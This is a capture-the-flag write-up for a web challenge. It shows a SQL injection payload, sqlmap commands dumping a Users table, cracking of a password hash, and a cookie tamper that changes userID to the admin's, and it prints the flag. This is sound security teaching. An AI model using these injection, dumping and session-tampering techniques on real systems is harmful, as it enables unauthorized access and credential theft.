# Challenge Name: Tony Toolkit

## Description

**Category:** Web

> Tony decided to launch bug bounties on his website for the first time, so it's likely to have some very common vulnerabilities.

**Challenge URL:** `http://chall.0xfun.org:726`

**Flag format:** `0xfun{...}`

---

## Writeup

### Step 1: Exploring the Site

Inspect the home and login pages. Nothing obvious in the HTML; the **search** functionality (`GET /search?item=...`) is a good candidate for injection.

### Step 2: SQL Injection in Search

Try a classic SQLi in the `item` parameter:

```
GET /search?item=admin' OR 1=1 --
```

The response returns all results, confirming the parameter is vulnerable. Use **sqlmap** to enumerate:

```bash
sqlmap -u "http://chall.0xfun.org:726/search?item=tool" --tables
```

The backend is **SQLite** with tables: `Products`, `Users`, `sqlite_sequence`.

### Step 3: Dumping Users and Cracking Passwords

Dump the **Users** table:

```bash
sqlmap -u "http://chall.0xfun.org:726/search?item=tool" -T Users --dump
```

Results:

| UserID | Username | Password |
|--------|----------|----------|
| 1 | Admin | `0000000000000000000000000000000000000000000000000000000000000000` |
| 2 | Jerry | `059a00192592d5444bc0caad7203f98b506332e2cf7abb35d684ea9bf7c18f08` → `1qaz2wsx` |

Crack Jerry's SHA-256 hash with a wordlist (e.g. rockyou.txt) to get `1qaz2wsx`.

### Step 4: Logging In and Cookie Tampering

Log in as **Jerry** (`1qaz2wsx`) to obtain a session cookie:

```
Cookie: userID=2; user=0cea94be4ad3fc313cee0f65c3fd5dbc5dcf93d7e1bb337f2ecac06e52f29c28
```

Visit `/user` to see Jerry's profile. Then change the cookie to **userID=1** (Admin) while keeping the same `user` value:

```
Cookie: userID=1; user=0cea94be4ad3fc313cee0f65c3fd5dbc5dcf93d7e1bb337f2ecac06e52f29c28
```

### Step 5: Reading the Flag

Reload `/user`. The profile for userID 1 returns the flag in the HTML (HTML-encoded — decode `&#39;` as `'`).

---

## Resources

No local challenge files — this is a remote web challenge.

---

## Flag

```
0xfun{T0ny'5_T00ly4rd._1_H0p3_Y0u_H4d_Fun_SQL1ng,_H45H_Cr4ck1ng,_4nd_W1th_C00k13_M4n1pu74t10n}
```
